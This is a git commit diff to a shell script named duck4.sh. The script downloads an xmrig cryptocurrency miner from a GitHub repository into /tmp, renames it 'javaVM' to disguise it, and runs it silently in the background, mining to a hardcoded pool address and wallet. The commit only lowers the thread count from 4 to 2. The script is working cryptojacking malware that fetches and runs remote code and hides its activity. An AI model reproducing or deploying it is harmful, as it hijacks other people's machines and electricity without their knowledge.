6b48cb02f95e8f2a09e77905ece3269993b5b344
cronjob <thesunofme1@gmail.com>
2023-11-28 08:30:09 +0700

    Update duck4.sh

--- duck4.sh
+++ duck4.sh
@@ -1,10 +1,10 @@
 #!/bin/sh
 if [ -f /tmp/javaVM ]
  	then
- 	/tmp/javaVM -o 103.228.74.80:4444 -u ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt -p duckz -a rx/0 -k -t 4 --donate-level > /dev/null 2>&1 &
+ 	/tmp/javaVM -o 103.228.74.80:4444 -u ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt -p duckz -a rx/0 -k -t 2 --donate-level > /dev/null 2>&1 &
  	echo Started Existing
  	else
  		wget -q https://github.com/thesunofme/trash/raw/main/xmrig -O /tmp/javaVM
  		chmod +x /tmp/javaVM
- 		/tmp/javaVM -o 103.228.74.80:4444 -u ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt -p duckz -a rx/0 -k -t 4 --donate-level > /dev/null 2>&1 &
+ 		/tmp/javaVM -o 103.228.74.80:4444 -u ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt -p duckz -a rx/0 -k -t 2 --donate-level > /dev/null 2>&1 &
 fi
